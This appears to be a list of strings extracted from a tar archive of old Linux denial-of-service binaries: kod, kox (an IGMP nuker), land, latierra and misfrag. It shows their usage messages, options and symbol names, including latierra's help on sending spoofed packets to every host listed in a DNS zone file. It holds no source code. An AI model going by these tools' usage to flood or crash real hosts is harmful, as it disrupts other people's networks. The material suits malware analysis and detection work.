            "hits",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "port",
            "__data_start",
            "socket@@GLIBC_2.0",
            "herror@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/kod",
            "0100755",
            "0000000",
            "0000000",
            "00000012064",
            "07061546647",
            "012655",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "usleep",
            "memcpy",
            "perror",
            "puts",
            "sleep",
            "socket",
            "send",
            "__deregister_frame_info",
            "herror",
            "strcmp",
            "gethostbyname",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh,",
            "QVht",
            "'U=p",
            "u'EE",
            "u!EE",
            "UPHP",
            "u&h\u040b",
            "EPLPHP",
            ":Zt+h",
            "PEPEPEPh ",
            "EPLPHP",
            "PEPEPhH",
            "\u0403;u]",
            "Usage: %s <host> -p port -t hits",
            "Must specify a target.",
            "error: socket()",
            "error: connect()",
            "Determining max MSGSIZE",
            "error: send()",
            "Max MSGSIZE is %d",
            "..%d bytes [%s:%d]..",
            "..%d bytes [%s:%d]..",
            "complete.",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "datapool/bin/kox",
            "0100755",
            "0000000",
            "0000000",
            "00000035770",
            "07100656624",
            "012701",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "memcpy",
            "perror",
            "getuid",
            "socket",
            "fflush",
            "uname",
            "calloc",
            "__deregister_frame_info",
            "sendto",
            "inet_aton",
            "time",
            "herror",
            "getpwuid",
            "gethostbyname",
            "sprintf",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "U$Sj",
            "EE\u4e69EE",
            "\u044bE)\u020dP",
            "RME\u4e69EE",
            "\u044bE)\u020dP",
            "E\u4e69EE",
            "\u044bE)\u020dP",
            "REiEE",
            ")\u04cbE)\u060dP",
            "EP EPEP",
            "S1\u0483}",
            "]1fE",
            "U@VSE",
            "E\u0639hE",
            "U\u0703EPj",
            "EEEE",
            "1fEPC",
            "1fEP!",
            "E;E|",
            "E\u060bUM",
            "E\u053bE\u044bE\u060d",
            ")\u02cbE)\u060bU\u0508",
            "E\ub950t&",
            "EDEEP",
            "EPEPEP u",
            "1fR3",
            " 1fP",
            "EPEPEP Ef",
            "e[^]",
            "fEfE",
            "E\ub983h4",
            "\u0403;u[]",
            "Kox by Coolio (coolio@k-r4d.com)",
            "Usage: %s <victim> <number>",
            "%d.%d.%d.%d",
            "error: socket()",
            "error: sendto()",
            "IGMP> ",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "kox.c",
            "_DYNAMIC",
            "nuke_igmp",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "getpwuid@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "inet_aton@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "uname@@GLIBC_2.0",
            "randip",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "getuid@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "calloc@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "herror@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/land",
            "0100755",
            "0000000",
            "0000000",
            "00000010054",
            "07061546650",
            "013005",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "_DYNAMIC",
            "_IO_stderr_",
            "socket",
            "__environ",
            "bzero",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "inet_addr",
            "__fpu_control",
            "htonl",
            "sendto",
            "bcopy",
            "gethostbyname",
            "_fini",
            "atexit",
            "_GLOBAL_OFFSET_TABLE_",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "close",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "PW[&",
            "fUfE",
            "f9Er",
            "fE\u0650fEf",
            "UhMMEH",
            "t$EP",
            "Uu'E",
            "fUfu(E",
            "j(EPu",
            "EfUf",
            "EfUfP",
            "j EP",
            "EEEEE",
            "j EP",
            "j(EPEP",
            "\u0403;u[",
            "land.c by m3lt, FLC",
            "usage: %s IP port",
            "unknown host %s",
            "unknown port %s",
            "couldn't allocate raw socket",
            "couldn't send packet",
            "%s:%s landed",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "datapool/bin/latierra",
            "0100755",
            "0000000",
            "0000000",
            "00000032274",
            "07061546650",
            "013702",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "strcpy",
            "printf",
            "_DYNAMIC",
            "fgets",
            "_IO_stderr_",
            "sleep",
            "optarg",
            "socket",
            "__environ",
            "bzero",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "strcat",
            "inet_addr",
            "__fpu_control",
            "strncmp",
            "htonl",
            "sendto",
            "bcopy",
            "strtok",
            "fopen",
            "getopt",
            "strcmp",
            "_fini",
            "sprintf",
            "atexit",
            "access",
            "_GLOBAL_OFFSET_TABLE_",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "strlen",
            "close",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "PG[&",
            "66M .6",
            "(-urP6",
            "\"6PhN",
            "6Ph~",
            "EPh\t",
            "EPEPh(",
            "EPhL",
            "EPhk",
            "u!PhC",
            "PEPP",
            "~=t*9}",
            "pPPU",
            "t?PEPP@",
            "8;taE",
            "8[tYE",
            "WEPj",
            "6EPE",
            "fUfE",
            "f9Er",
            "fE\u0650fEf",
            "UdS]\u0109]E\u010dX",
            "fUfu",
            "j(EP",
            "H\tEUP",
            "EfUf",
            "EfUfP",
            "j EP!",
            "EEEEE",
            "REPd",
            "j EPz",
            "Rj(EPEP",
            "6Uh\u052a",
            "\u0403;u[",
            "latierra v1.0b by MondoMan (elmondo@usa.net), KeG",
            "Enhanced version of land.c originally developed by m3lt, FLC",
            "fsrpau",
            "i:b:e:s:l:o:t:w:p:q:v:m:",
            "ERROR: Invalid option specified [ %c ] for tcp_flags.",
            "ERROR: Must specify valid IP or hostname.",
            "Must specify beginning port number.  Use -h for help with arguments.",
            "Settings:",
            "  (-i)   Dest. IP Addr   : ",
            " %s (Class C range specified).",
            "zone=",
            "%s (using DNS zone file)",
            "list=",
            "%s (using ASCII list)",
            "Destination specifier (%s) length must be > 7.",
            "  (-b)   Beginning Port #: %d",
            "  (-e)   Ending Port #   : %d",
            "  (-s)   Seconds to Pause: %d",
            "(forever)",
            "  (-l)   Loop            : %d %s",
            "  (-w)   Window size     : %d",
            "  (-q)   Sequence Number : %X (%d)",
            "  (-v)   Time-to-Live    : %d",
            "  (-p)   IP Protocol #   : %d",
            "  (-t)   TCP flags       : ",
            "fin ",
            "syn ",
            "rst ",
            "push ",
            "ack ",
            "urg ",
            "ERROR: Ending port # must be greater than beginning port #",
            "ERROR: The file you specified (%s) cannot be found.",
            "ERROR: Unable to open %s.",
            "Unable to get any IP address from file %s.",
            "-> paused %d seconds.",
            "%s%d",
            "** incrementing to next IP address: %s",
            "Done.",
            "ls -d",
            "ERROR: unknown host %s",
            "ERROR: unknown port %s",
            "ERROR: couldn't allocate raw socket",
            "ERROR: can't send packet. (sendto failed)",
            "-> packet successfully sent to: %s:%d",
            "Alternative command line arguments for option -i",
            "    You can create two types of files that latierra can use to get",
            "    a list of IP addresses, a simple ASCII file with each IP address",
            "    appearing on each line or better yet, a DNS zone file created by",
            "    nslookup.  If you are unfamiliar with nslookup, specify a '-n' on the",
            "    command line of latierra.",
            "    Basically, latierra will walk down the list and send the spoofed packet",
            "    to each IP address.  Once the list is complete, and loop > 1, the list",
            "    is repeated.   To specify that the '-i' option should use a zone file,",
            "    specify \"zone=filename.txt\" instead of an IP address.  To specify a ",
            "    simple ASCII list of IP addresses, use \"list=filename.txt\".  Lines",
            "    beginning with ';' or '[' are ignored.  Lines that are not an 'A' ",
            "    record (second column)in a zone file will ignored.",
            "NSLOOKUP help",
            "To see who is the DNS server for a particular domain, issue the following:",
            "        > set type=ns",
            "        > xyz.com",
            "  You will see a list of the name server(s) if completed successfully",
            "To get a list of all the DNS entries for a particular domain, run nslookup",
            "and issue the following commands:",
            "         > server 1.1.1.1",
            "         > ls -d xyz.com > filename.txt",
            "Line 1 sets the server that nslookup will use to resolve a name.",
            "Line 2 requires all the information about xyz.com be written to filename.txt",
            "Protocol List:",
            "Verified:",
            "1-ICMP   2-IGMP   3-GGP  5-ST   6-TCP   7-UCL   8-EGP   9-IGP  10-BBN_RCC_MON",
            "11-NVP11   13-ARGUS   14-EMCON   15-XNET   16-CHAOS   17-UDP   18-MUX",
            "19-DCN_MEAS   20-HMP   21-PRM   22-XNS_IDP   23-TRUNK1   24-TRUNK2",
            "25-LEAF1   26-LEAF2    27-RDP   28-IRTP      29-ISO_TP4  30-NETBLT",
            "31-MFE_NSP   32-MERIT_INP   33-SEP   34-3PC   62-CFTP    64-SAT_EXPAK",
            "66-RVD       67-IPPC        69-SAT_MON   70-VISA         71-IPCV",
            "76-BR_SAT_MON   77-SUN_ND   78-WB_MON   79-WB_EXPAK   80-ISO_IP",
            "81-VMTP   82-SECURE_VMTP   83-VINES  84-TTP   85-NSFNET_IGP   86-DGP",
            "87-TCF    88-IGRP          89-OSPFIGP         90-SPRITE_RPG   91-LARP",
            "Supported:",
            "    6-TCP     17-UDP    (future: PPTP, SKIP) ",
            "Arguments: ",
            "     *   -i dest_ip = destination ip address such as 1.1.1.1",
            "                If last octet is '-', then the address will increment",
            "                from 1 to 254 (Class C) on the next loop",
            "                and loop must be > 1 or %d (forever).",
            "                Alternatives = zone=filename.txt or list=filename.txt (ASCII)",
            "                For list of alternative options, use  -a instead of -h.",
            "     *   -b port# = beginning port number (required).",
            "         -e port# = ending port number (optional)",
            "         -t = tcp flag options (f=fin,~s=syn,r=reset,~p=push,a=ack,u=urgent)",
            "         -v = time_to_live value, default=%d",
            "         -p protocol = ~6=tcp, 17=udp, use -p option for complete list",
            "         -w window_size = value from 0 to ?, default=%d",
            "         -q tcp_sequence_number, default=%d",
            "         -m message_type (~0=none,1=Out-Of-Band,4=Msg_DontRoute",
            "         -s seconds = delay between port numbers, default=%d",
            "         -o 1 = supress additional output to screen, default=0",
            "         -l loop = times to loop through ports/scan, default=%d, %d=forever",
            "     * = required     ~ = default parameter values",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "datapool/bin/misfrag",
            "0100755",
            "0000000",
            "0000000",
            "00000035163",
            "07100656634",
            "013525",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "htonl",
            "sendto",
            "bcopy",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhd",
            "S1\u048d&",
            "]1fE",
            "fEfUfME\u0109EE\u010dP",
            "UE\u010dP Uj4EP",
            "(Ef@",
            "EU$(fP",
            "1fEP",
            "1fEPt",
            "j EP",
            "EPEP)",
            "E$(PEPE",
            "Ukt&",
            "REPEP",
            "EPJ }1h1",
            "E1fP\udbec\udd78P",
            "1fP\udbec\udd74Pk",
            "1fPP1fPPEPE j",
            "1fPP1fPPEP",
            "\u0403;u[]",
            "[0;34mP.A.T.C.H. production - misteri0",
            "[0;0m",
            "[1;36mUsage: ",
            "[0;31m%s ",
            "[1;32m[",
            "[0;36msrcip",
            "[1;32m] ",
            "[1;32m[",
            "[0;36msrc start port",
            "[1;32m] ",
            "[1;32m[",
            "[0;36mdstip",
            "[1;32m] ",
            "[1;32m[",
            "[0;36mdst start port",
            "[1;32m] ",
            "[1;32m[",
            "[0;36mcount",
            "[1;32m]",
            "[0;0m",
            "[0;35mNote: ",
            "[0;33mThe source/destination ports will increment by 1",
            "[0;0m",
            "Can not resolve name: %s",
            "RawSocket:",
            "SetSockOpt:",
            "sending packet from: %s:%i ",
            "to %s:%i",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
